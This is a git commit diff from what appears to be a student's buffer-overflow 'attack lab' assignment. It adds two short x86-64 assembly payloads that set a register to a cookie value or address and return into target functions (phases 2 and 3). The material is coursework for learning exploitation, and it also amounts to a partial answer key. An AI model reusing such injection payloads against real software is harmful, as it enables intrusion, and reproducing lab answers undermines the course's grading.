f5eeb82118e780178f2a78812003ea224d631d04
Angeli Mittal <amc4261@moore.wot.eecs.northwestern.edu>
2021-05-23 20:36:19 -0500

    phase 2, 3 finished

---
+++ attack/target100/injected_2.s
@@ -0,0 +1,3 @@
+movq $0x599051eb, %rdi # push cookie to stack
+pushq $0x401941 # address of touch2
+retq
---
+++ attack/target100/injected_3.s
@@ -0,0 +1,3 @@
+movq $0x55629e98, %rdi # push rsp to stack
+addq $0x38, %rdi # add to address to get cookie address
+retq
